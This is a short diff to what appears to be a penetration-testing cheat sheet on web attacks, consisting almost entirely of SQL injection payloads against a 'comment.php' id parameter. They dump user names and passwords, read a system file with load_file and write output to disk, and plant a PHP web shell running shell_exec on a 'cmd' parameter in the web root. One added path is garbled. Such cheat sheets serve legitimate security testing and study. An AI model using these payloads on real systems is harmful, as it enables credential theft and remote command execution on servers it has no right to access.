@@ -1873,6 +1873,11 @@ Client, Web and Password Attacks
         
         `http://$ip/comment.php?id=738 union select 1,2,3,4,concat(name,0x3a, password),6 FROM users ` 
         
+        SQL include file 
+        
+        `http://$ip/comment.php?id=738 union all select 1,2,3,4,load_file('c:/windows/system32/drivers.etc.hosts'),6 into OUTFILE        'c:/xampp/htdocs/backdoor.php'`        
+        
+        
         Create a backdoor
         
         `http://$ip/comment.php?id=738 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE        'c:/xampp/htdocs/backdoor.php'`
